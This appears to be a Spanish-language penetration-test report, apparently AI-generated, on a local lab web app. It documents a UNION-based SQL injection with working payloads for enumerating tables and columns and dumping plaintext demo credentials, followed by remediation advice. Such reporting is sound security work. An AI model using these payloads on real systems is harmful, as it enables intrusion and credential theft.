# Informe de Auditoría de Seguridad - SQL Injection
**Fecha:** 2026-04-30 15:42:56 UTC  
**Objetivo:** http://web.dev.local:8083  
**Tipo de análisis:** SQL Injection  
**Modelo:** claude-sonnet-4.6  

---

## 1. Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection clásica (UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite a un atacante extraer toda la información de la base de datos, incluyendo credenciales de usuario en texto plano.

---

## 2. Descripción del Objetivo

La aplicación web expone un formulario de búsqueda de usuarios con un campo `id` enviado vía GET. No existe ningún tipo de sanitización ni uso de consultas preparadas, lo que resulta en una vulnerabilidad crítica de inyección SQL.

- **URL:** `http://web.dev.local:8083/`
- **Parámetros vulnerables:** `id` (GET)
- **Base de datos backend:** MariaDB 10.11.14-ubu2204
- **Base de datos afectada:** `sqli_demo`

---

## 3. Vulnerabilidades Encontradas

### 3.1 SQL Injection - UNION Based (CRÍTICA)

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection - UNION-based |
| **Severidad** | Crítica (CVSS 9.8) |
| **Parámetro** | `id` (método GET) |
| **Archivo vulnerable** | `/var/www/html/low.php` (línea 11) |

#### Evidencia de vulnerabilidad

Al enviar una comilla simple, la aplicación revela un error SQL:

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

---

## 4. Explotación

### 4.1 Confirmación del número de columnas

Mediante `ORDER BY` se determinó que la consulta retorna **2 columnas**:
- `ORDER BY 2` → Éxito
- `ORDER BY 3` → Error: `Unknown column '3' in 'ORDER BY'`

### 4.2 Extracción de información del servidor

**Payload:**
```
-1' UNION SELECT version(),database()-- -
```

**Resultado:**
- Versión DB: `10.11.14-MariaDB-ubu2204`
- Base de datos actual: `sqli_demo`

### 4.3 Enumeración de tablas

**Payload:**
```
-1' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Resultado:**
- Tabla encontrada: `users`

### 4.4 Enumeración de columnas

**Payload:**
```
-1' UNION SELECT GROUP_CONCAT(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```

**Columnas encontradas:** `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

### 4.5 Extracción de credenciales

**Payload:**
```
-1' UNION SELECT GROUP_CONCAT(username,0x3a,password),GROUP_CONCAT(email) FROM users-- -
```

**Credenciales extraídas:**

| Usuario | Contraseña | Email |
|---------|-----------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

> ⚠️ Las contraseñas se almacenan en **texto plano**, lo que agrava significativamente el impacto de la vulnerabilidad.

---

## 5. Impacto

- **Confidencialidad:** CRÍTICO — Exposición total de credenciales y datos de usuarios
- **Integridad:** ALTO — Posibilidad de modificar/eliminar datos de la base de datos
- **Disponibilidad:** MEDIO — Posibilidad de eliminar tablas o datos críticos
- **Autenticación:** CRÍTICO — Las credenciales expuestas permiten acceso directo a la aplicación

---

## 6. Recomendaciones

1. **Consultas preparadas (Prepared Statements):** Usar `mysqli_prepare()` o PDO con parámetros enlazados para evitar la inyección SQL.
   ```php
   $stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   ```

2. **Validación de entrada:** Validar y sanitizar todos los datos de entrada del usuario. Para IDs numéricos, asegurarse de que el valor sea efectivamente un entero.

3. **Hashear contraseñas:** Almacenar contraseñas usando `password_hash()` con bcrypt, nunca en texto plano.

4. **Principio de mínimo privilegio:** El usuario de base de datos utilizado por la aplicación no debería tener permisos de acceso a `information_schema` ni permisos de escritura innecesarios.

5. **Manejo de errores:** Deshabilitar la visualización de errores de base de datos en producción para no revelar información sensible al atacante.

6. **WAF:** Considerar la implementación de un Web Application Firewall como capa adicional de protección.

---

## 7. Conclusión

La aplicación presenta una vulnerabilidad crítica de SQL Injection que fue explotada exitosamente para extraer todas las credenciales de los usuarios de la base de datos. El ataque fue posible debido a la ausencia de validación de entradas y el uso de consultas SQL dinámicas sin parametrización. Se recomienda remediar esta vulnerabilidad de forma inmediata.
